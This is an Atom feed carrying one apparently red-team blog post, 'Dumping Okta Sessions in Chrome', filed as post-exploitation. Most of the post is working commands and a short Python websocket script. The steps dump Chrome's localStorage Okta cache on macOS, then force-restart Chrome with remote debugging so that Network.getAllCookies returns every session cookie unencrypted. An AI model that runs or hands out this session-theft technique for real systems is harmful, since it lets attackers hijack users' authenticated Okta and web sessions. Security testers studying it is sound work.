<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-18T01:12:01-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jkuo security</title><subtitle></subtitle><entry><title type="html">Dumping Okta Sessions in Chrome</title><link href="http://localhost:4000/post-exploitation/2024/11/17/chrome.html" rel="alternate" type="text/html" title="Dumping Okta Sessions in Chrome" /><published>2024-11-17T03:00:00-06:00</published><updated>2024-11-17T03:00:00-06:00</updated><id>http://localhost:4000/post-exploitation/2024/11/17/chrome</id><content type="html" xml:base="http://localhost:4000/post-exploitation/2024/11/17/chrome.html"><![CDATA[<h1 id="localstorage">LocalStorage</h1>

<p>Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: <code class="language-plaintext highlighter-rouge">/Users/&lt;user&gt;/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb</code>.</p>

<p>To dump localStorage:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">git clone https://github.com/rdreher/chromeStorageDump</code></li>
  <li>Avoid a file lock, by first copying leveldb to /tmp</li>
  <li><code class="language-plaintext highlighter-rouge">cp -R "/Users/&lt;user&gt;/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb" "/tmp/leveldb"</code></li>
  <li><code class="language-plaintext highlighter-rouge">node chromeStorageDump.js -k okta-cache-storage "/tmp/leveldb"</code></li>
</ul>

<h1 id="cookies">Cookies</h1>

<p>Google Chrome (macOS) cookies are saved in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetch by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the <code class="language-plaintext highlighter-rouge">--remote-debugging-port</code> flag.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">killall Google\ Chrome</code></li>
  <li><code class="language-plaintext highlighter-rouge">/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --user-data-dir="/Users/&lt;user&gt;/Library/Application Support/Google/Chrome" --restore-last-session</code></li>
</ul>

<p>The following <code class="language-plaintext highlighter-rouge">/json</code> endpoint provides a list of websocket addresses.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">curl http://localhost:9222/json</code></li>
</ul>

<p>Using a websocket client, connect to the correct address to reveal the unencrypted cookie in JSON format.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pip3 install websocket</code></li>
  <li><code class="language-plaintext highlighter-rouge">pip3 install websocket-client</code></li>
</ul>

<h4 id="ripwcmnpy"><strong><code class="language-plaintext highlighter-rouge">ripWCMN.py</code></strong></h4>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">websocket</span>
<span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="nc">WebSocket</span><span class="p">()</span>
<span class="n">ws</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00</span><span class="sh">"</span><span class="p">,</span> <span class="n">suppress_origin</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">'</span><span class="s">{</span><span class="se">\"</span><span class="s">id</span><span class="se">\"</span><span class="s">: 1, </span><span class="se">\"</span><span class="s">method</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Network.getAllCookies</span><span class="se">\"</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">())</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">python3 rip ripWCMN.py  | jq -c '.result.cookies[].name="idx"'</code></li>
</ul>

<p>Credit: Justin Bui and @mangopdf</p>

<h3 id="references">References:</h3>
<ul>
  <li>https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies</li>
  <li>https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec</li>
  <li>https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f</li>
  <li>https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e</li>
</ul>]]></content><author><name></name></author><category term="post-exploitation" /><summary type="html"><![CDATA[LocalStorage]]></summary></entry></feed>